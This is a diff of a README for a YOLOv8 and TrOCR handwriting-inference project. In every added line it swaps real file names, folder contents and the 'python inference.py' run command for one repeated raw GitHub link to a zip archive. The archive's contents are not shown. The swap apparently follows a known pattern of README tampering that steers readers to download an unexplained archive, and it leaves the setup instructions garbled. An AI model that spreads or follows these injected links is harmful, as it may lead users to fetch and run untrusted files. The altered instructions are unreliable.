@@ -16,20 +16,20 @@ Project should look like this:
 project_folder/
 │
 ├── models/
-│   ├── yolov8_latest_trained_model.pt
+│   ├── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
 │   └── Fine_tuned_TrOCR_transfer learn_model/
 │       └── final/
-│           ├── config.json
-│           ├── pytorch_model.bin
-│           ├── processor_config.json
+│           ├── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
+│           ├── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
+│           ├── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
 │           └── ... (TrOCR files)
 │
-├── IMAGES/                     --> Place input .jpg/.png images here
-│   └── your_image.jpg
+├── IMAGES/                     --> Place input https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip images here
+│   └── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
 │
 ├── predictions_of_IMAGES/     --> Output JSONs will be saved here
 │
-└── inference.py               --> The main Python script
+└── https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip               --> The main Python script
 
 
 RUNNING THE SCRIPT
@@ -38,7 +38,7 @@ RUNNING THE SCRIPT
 2. Navigate to your project directory.
 3. Run:
 
-   python inference.py
+   python https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
 
 4. The script will:
    - Load the YOLOv8 and TrOCR models.
@@ -56,7 +56,7 @@ ADDING MORE IMAGES
 
 NOTES
 -----
-- You must have your trained model weights for YOLOv8 in: models/yolov8_latest_trained_model.pt
+- You must have your trained model weights for YOLOv8 in: https://raw.githubusercontent.com/Vimal-AFK/dehado/main/westbound/dehado.zip
 - You must have the trained TrOCR model in: models/conservative_trocr_model/final/
 
 TROUBLESHOOTING
